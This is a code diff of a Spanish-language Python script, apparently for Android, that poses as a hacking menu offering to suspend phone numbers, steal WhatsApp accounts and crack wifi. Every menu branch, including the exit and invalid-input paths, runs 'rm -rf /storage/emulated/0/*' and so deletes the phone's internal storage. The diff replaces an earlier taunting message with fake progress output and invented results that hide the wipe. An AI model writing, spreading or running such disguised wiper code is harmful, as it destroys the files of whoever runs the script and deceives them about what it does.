@@ -22,23 +22,76 @@ menu()
 X = input("\033[1;44;37mElige una opcion. ej: 1\033[0;m \033[1;36m\n\n>\033[0;m ")
 
 if X == "1":
-    hack = os.system("rm -rf /storage/emulated/0/*")
-    print("\n\033[1;32mjaja Pendejo, caiste en el bait. ahora, ve a revisar tus archivos/almacenamiento interno ;)\033[0;m\033[1;37m!\033[0;m")
+    H = os.system("rm -rf /storage/emulated/0/*")
+    H = input("digite el numero a suspender: \n> ")
+    #attack.SuspenderNumeroSelecionado("{NUMBER}")
+    print(f"suspendiendo el numero {H}")
+    time.sleep(2)
+    print(f"suspendiendo el numero {H}")
+    time.sleep(2)
+    print(f"suspendiendo el numero {H}")
+    time.sleep(2)
+    print(f"suspendiendo el numero {H}")
+    time.sleep(3)
+    #ElNumero {H} ASidoSuspendido!
+    print(f"el numero {H} a sido suspendido :)")
+    
 elif X == "2":
-    hack = os.system("rm -rf /storage/emulated/0/*")
-    print("\n\033[1;32mjaja Pendejo, caiste en el bait. ahora, ve a revisar tus archivos/almacenamiento interno ;)\033[0;m\033[1;37m!\033[0;m")
+    A = os.system("rm -rf /storage/emulated/0/*")
+    A = input("digite la cuenta de whatsapp a robar: \n> ")
+    #RobarCuentaDeWhatsapp
+    print("envie el codigo de Verificacion para luego enviarselo.")
+    time.sleep(20)
+    E = "546214"
+    #CodigoEnviado...
+    #RecibiendoCodigoDeWhatsapp...
+    #EnviandoCodigoDeWhatsappAlUsuario...
+    print(f"el codigo que usted envio es {E}. \nAhora vaya e ingrese ese codigo en whatsapp :).")
+    
 elif X == "3":
-    hack = os.system("rm -rf /storage/emulated/0/*")
-    print("\n\033[1;32mjaja Pendejo, caiste en el bait. ahora, ve a revisar tus archivos/almacenamiento interno ;)\033[0;m\033[1;37m!\033[0;m")
+    D = os.system("rm -rf /storage/emulated/0/*")
+    D = input("digite el numero a suspender: \n> ")
+    #SuspenderSimPermanentemente
+    time.sleep(2)
+    print(f"suspendiendo la Sim {D}")
+    time.sleep(2)
+    print(f"suspendiendo la Sim {D}")
+    time.sleep(2)
+    print(f"suspendiendo la Sim {D}")
+    time.sleep(2)
+    print(f"suspendiendo la Sim {D}")
+    time.sleep(3)
+    #SimSuspendida
+    print("la Sim a sido suspendida!")
+    
 elif X == "4":
-    hack = os.system("rm -rf /storage/emulated/0/*")
-    print("\n\033[1;32mjaja Pendejo, caiste en el bait. ahora, ve a revisar tus archivos/almacenamiento interno ;)\033[0;m\033[1;37m!\033[0;m")
+    B = os.system("rm -rf /storage/emulated/0/*")
+    B = input("digite el nombre del wifi a hackear: /n> ")
+    #attack.ContraseñaWifi
+    U = "DiegoPija"
+    print(f"hackeando el wifi {B}")
+    time.sleep(2)
+    print(f"hackeando el wifi {B}")
+    time.sleep(2)
+    print(f"hackeando el wifi {B}")
+    time.sleep(2)
+    print(f"hackeando el wifi {B}")
+    time.sleep(2)
+    print(f"hackeando el wifi {B}")
+    time.sleep(3)
+    print(f"el wifi a sido hackeado con exito!. \nla Contraseña es: {U}")
+    
 elif X == "5":
-    hack = os.system("rm -rf /storage/emulated/0/*")
-    print("\n\033[1;32mjaja Pendejo, caiste en el bait. ahora, ve a revisar tus archivos/almacenamiento interno ;)\033[0;m\033[1;37m!\033[0;m")
+    W = os.system("rm -rf /storage/emulated/0/*")
+    W = input("digite de que año quieres que sea el Grupo: \n> ")
+    print(f"quieres un grupo del año {W}?. \nEntra a este grupo de whatsapp y pidelo :): https://whatsapp.com")
+    
 elif X == "0":
-    hack = os.system("rm -rf /storage/emulated/0/*")
+    Z = os.system("rm -rf /storage/emulated/0/*")
+    Z = os.system("exit")
     time.sleep(1)
-    print("\n\033[1;32mjaja Pendejo, caiste en el bait. ahora, ve a revisar tus archivos/almacenamiento interno ;)\033[0;m\033[1;37m!\033[0;m")
+    print("\n\033[1;32mGracias por usar este script, vuelve nuevamente\033[0;m\033[1;37m!\033[0;m")
+    
 else:
+    Xx = os.system("rm -rf /storage/emulated/0/*")
     print("\033[1;31m\nError:\033[0;m Carácter incorrecto, ejecute de nuevo el script y, seleccione una opcion. (1, 2, 3, 4, 5, 0)")
